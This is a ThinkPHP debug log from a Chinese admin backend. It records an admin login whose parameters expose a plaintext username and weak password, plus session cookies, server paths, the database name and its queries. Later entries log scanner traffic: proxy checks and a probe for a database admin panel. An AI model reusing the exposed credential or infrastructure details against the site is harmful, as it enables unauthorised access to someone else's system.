[2019-06-04T15:10:40+08:00] 222.161.245.30 POST csgxjk.com/admin/login/login.html
[运行时间：0.041426s] [吞吐率：24.14req/s] [内存消耗：3,386.22kb] [文件加载：97]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'thinkphp_show_page_trace=0|0; ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/login/',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'x-requested-with' => 'XMLHttpRequest',
  'origin' => 'http://csgxjk.com',
  'accept' => '*/*',
  'content-length' => '30',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
)
[ info ] [ PARAM ] array (
  'username' => 'admin',
  'password' => '111111',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000522s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_admin` [ RunTime:0.001405s ]
[ sql ] [ SQL ] SELECT * FROM `bg_admin` WHERE  `username` = 'admin' LIMIT 1 [ RunTime:0.000356s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_log` [ RunTime:0.001077s ]
[ sql ] [ SQL ] INSERT INTO `bg_log` (`userid` , `username` , `ip` , `time`) VALUES (1 , 'admin' , '222.161.245.30' , 1559632239) [ RunTime:0.000306s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_role` [ RunTime:0.001052s ]
[ sql ] [ SQL ] SELECT `power` FROM `bg_role` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000256s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_menu` [ RunTime:0.001002s ]
[ sql ] [ SQL ] SELECT `id`,`router` FROM `bg_menu` WHERE  (  router <> ''  ) [ RunTime:0.000306s ]
[ sql ] [ SQL ] SELECT `power` FROM `bg_role` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000307s ]
[ sql ] [ SQL ] select id,name,router,pid,menuIcon from bg_menu where isMenu&1 order by pid asc, orderNumber asc [ RunTime:0.000345s ]
---------------------------------------------------------------
[2019-06-04T15:10:40+08:00] 222.161.245.30 GET csgxjk.com/admin/login/admin.html
[运行时间：0.017897s] [吞吐率：55.87req/s] [内存消耗：2,139.30kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'thinkphp_show_page_trace=0|0; ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/login/',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T15:10:40+08:00] 222.161.245.30 GET csgxjk.com/admin/login/index.html
[运行时间：0.017777s] [吞吐率：56.25req/s] [内存消耗：2,143.74kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'thinkphp_show_page_trace=0|0; ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/login/',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T15:10:40+08:00] 222.161.245.30 GET csgxjk.com/admin/index/index.html
[运行时间：0.018695s] [吞吐率：53.49req/s] [内存消耗：2,181.53kb] [文件加载：84]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'thinkphp_show_page_trace=0|0; ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/login/',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/index_index.php [ array (
  0 => 'userinfo',
  1 => 'menu',
) ]
---------------------------------------------------------------
[2019-06-04T15:10:40+08:00] 222.161.245.30 GET csgxjk.com/admin/dashboard/welcome.html
[运行时间：0.027101s] [吞吐率：36.90req/s] [内存消耗：3,095.98kb] [文件加载：90]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/index/index.html',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/dashboard_welcome.php [ array (
  0 => 'username',
  1 => 'web_site',
  2 => 'all_nav',
) ]
[ sql ] [ DB ] CONNECT:[ UseTime:0.000454s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_category` [ RunTime:0.001484s ]
[ sql ] [ SQL ] SELECT * FROM `bg_category` [ RunTime:0.000372s ]
---------------------------------------------------------------
[2019-06-04T15:10:45+08:00] 222.161.245.30 GET csgxjk.com/admin/device/index.html
[运行时间：0.035400s] [吞吐率：28.25req/s] [内存消耗：3,710.63kb] [文件加载：102]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/index/index.html',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/device_index.php [ array (
  0 => 'username',
  1 => 'web_site',
  2 => 'all_nav',
  3 => 'objarr',
  4 => 'devtype',
) ]
[ sql ] [ DB ] CONNECT:[ UseTime:0.000470s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_category` [ RunTime:0.001493s ]
[ sql ] [ SQL ] SELECT * FROM `bg_category` [ RunTime:0.000395s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001227s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` [ RunTime:0.000275s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_devtype` [ RunTime:0.001091s ]
[ sql ] [ SQL ] SELECT * FROM `bg_devtype` [ RunTime:0.000291s ]
---------------------------------------------------------------
[2019-06-04T15:10:46+08:00] 222.161.245.30 POST csgxjk.com/admin/device/index.html
[运行时间：0.033780s] [吞吐率：29.60req/s] [内存消耗：3,663.91kb] [文件加载：102]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'thinkphp_show_page_trace=0|0; ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/device/index.html',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'x-requested-with' => 'XMLHttpRequest',
  'origin' => 'http://csgxjk.com',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'content-length' => '15',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
)
[ info ] [ PARAM ] array (
  'page' => '1',
  'limit' => '10',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000478s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_category` [ RunTime:0.001500s ]
[ sql ] [ SQL ] SELECT * FROM `bg_category` [ RunTime:0.000366s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001126s ]
[ sql ] [ SQL ] SELECT SQL_CALC_FOUND_ROWS * FROM `bg_device` WHERE  ( 1=1 ) ORDER BY `id` DESC LIMIT 0,10 [ RunTime:0.000328s ]
[ sql ] [ SQL ] select found_rows() as coun [ RunTime:0.000194s ]
---------------------------------------------------------------
[2019-06-04T15:10:49+08:00] 222.161.245.30 POST csgxjk.com/admin/device/index.html
[运行时间：0.032904s] [吞吐率：30.39req/s] [内存消耗：3,663.91kb] [文件加载：102]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'thinkphp_show_page_trace=0|0; ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/device/index.html',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'x-requested-with' => 'XMLHttpRequest',
  'origin' => 'http://csgxjk.com',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'content-length' => '15',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
)
[ info ] [ PARAM ] array (
  'page' => '2',
  'limit' => '10',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000436s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_category` [ RunTime:0.001418s ]
[ sql ] [ SQL ] SELECT * FROM `bg_category` [ RunTime:0.000383s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001070s ]
[ sql ] [ SQL ] SELECT SQL_CALC_FOUND_ROWS * FROM `bg_device` WHERE  ( 1=1 ) ORDER BY `id` DESC LIMIT 10,10 [ RunTime:0.000309s ]
[ sql ] [ SQL ] select found_rows() as coun [ RunTime:0.000177s ]
---------------------------------------------------------------
[2019-06-04T15:10:54+08:00] 222.161.245.30 POST csgxjk.com/admin/device/index.html
[运行时间：0.033247s] [吞吐率：30.08req/s] [内存消耗：3,663.91kb] [文件加载：102]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'thinkphp_show_page_trace=0|0; ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/device/index.html',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'x-requested-with' => 'XMLHttpRequest',
  'origin' => 'http://csgxjk.com',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'content-length' => '15',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
)
[ info ] [ PARAM ] array (
  'page' => '1',
  'limit' => '10',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000474s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_category` [ RunTime:0.001485s ]
[ sql ] [ SQL ] SELECT * FROM `bg_category` [ RunTime:0.000389s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001173s ]
[ sql ] [ SQL ] SELECT SQL_CALC_FOUND_ROWS * FROM `bg_device` WHERE  ( 1=1 ) ORDER BY `id` DESC LIMIT 0,10 [ RunTime:0.000347s ]
[ sql ] [ SQL ] select found_rows() as coun [ RunTime:0.000194s ]
---------------------------------------------------------------
[2019-06-04T15:11:07+08:00] 222.161.245.30 POST csgxjk.com/admin/device/index.html
[运行时间：0.032263s] [吞吐率：31.00req/s] [内存消耗：3,663.91kb] [文件加载：102]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'thinkphp_show_page_trace=0|0; ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/device/index.html',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'x-requested-with' => 'XMLHttpRequest',
  'origin' => 'http://csgxjk.com',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'content-length' => '15',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
)
[ info ] [ PARAM ] array (
  'page' => '2',
  'limit' => '10',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000456s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_category` [ RunTime:0.001464s ]
[ sql ] [ SQL ] SELECT * FROM `bg_category` [ RunTime:0.000384s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001072s ]
[ sql ] [ SQL ] SELECT SQL_CALC_FOUND_ROWS * FROM `bg_device` WHERE  ( 1=1 ) ORDER BY `id` DESC LIMIT 10,10 [ RunTime:0.000319s ]
[ sql ] [ SQL ] select found_rows() as coun [ RunTime:0.000194s ]
---------------------------------------------------------------
[2019-06-04T15:24:01+08:00] 91.237.161.93 GET 39.96.87.22:80/
[运行时间：0.015889s] [吞吐率：62.94req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T15:32:16+08:00] 5.234.167.85 GET 39.96.87.22:80/
[运行时间：0.016684s] [吞吐率：59.94req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T15:48:50+08:00] 201.76.118.55 GET 39.96.87.22:80/
[运行时间：0.016564s] [吞吐率：60.37req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T16:27:55+08:00] 189.79.95.160 GET 39.96.87.22:80/
[运行时间：0.016795s] [吞吐率：59.54req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T17:31:48+08:00] 190.104.46.179 GET 39.96.87.22:80/
[运行时间：0.016707s] [吞吐率：59.85req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T17:42:48+08:00] 159.65.27.112 HEAD csgxjk.com/
[运行时间：0.016546s] [吞吐率：60.44req/s] [内存消耗：1,983.76kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => 'csgxjk.com',
  'accept-encoding' => 'identity',
  'accept' => '*/*',
  'user-agent' => 'Wget/1.17.1 (linux-gnu)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T17:42:49+08:00] 159.65.27.112 GET csgxjk.com/
[运行时间：0.016833s] [吞吐率：59.41req/s] [内存消耗：1,984.31kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => 'csgxjk.com',
  'accept-encoding' => 'identity',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T18:15:54+08:00] 139.162.88.63 GET clientapi.ipip.net/echo.php?info=1234567890
[运行时间：0.015052s] [吞吐率：66.44req/s] [内存消耗：1,730.63kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T18:23:31+08:00] 193.201.88.45 GET 39.96.87.22:80/
[运行时间：0.016713s] [吞吐率：59.83req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T20:00:53+08:00] 95.213.177.126 POST check.proxyradar.com/azenv.php?auth=155964965347&a=PSCN&i=660625174&p=80
[运行时间：0.015229s] [吞吐率：65.66req/s] [内存消耗：1,730.60kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T21:20:12+08:00] 81.67.163.155 GET 39.96.87.22/mysql/admin/index.php?lang=en
[运行时间：0.014970s] [吞吐率：66.80req/s] [内存消耗：1,730.64kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T22:32:48+08:00] 101.85.21.89 GET www.csgxjk.com/
[运行时间：0.016544s] [吞吐率：60.45req/s] [内存消耗：1,984.48kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'proxy-connection' => 'Keep-Alive',
  'host' => 'www.csgxjk.com',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)',
  'content-type' => 'application/x-www-form-urlencoded',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T22:33:28+08:00] 71.6.202.198 GET 39.96.87.22/ccvv
[运行时间：0.015190s] [吞吐率：65.83req/s] [内存消耗：1,730.34kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T23:51:50+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
[运行时间：0.015205s] [吞吐率：65.77req/s] [内存消耗：1,730.33kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
